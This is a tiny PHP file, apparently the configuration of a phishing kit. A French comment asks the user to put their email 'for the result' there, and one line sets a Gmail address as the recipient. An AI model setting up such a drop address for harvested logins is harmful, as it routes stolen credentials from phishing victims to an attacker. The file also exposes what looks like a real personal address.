<?php
//TON EMAIL POUR LA RZLT ICI ;
  $to = "lebzozizo@gmail.com"
?>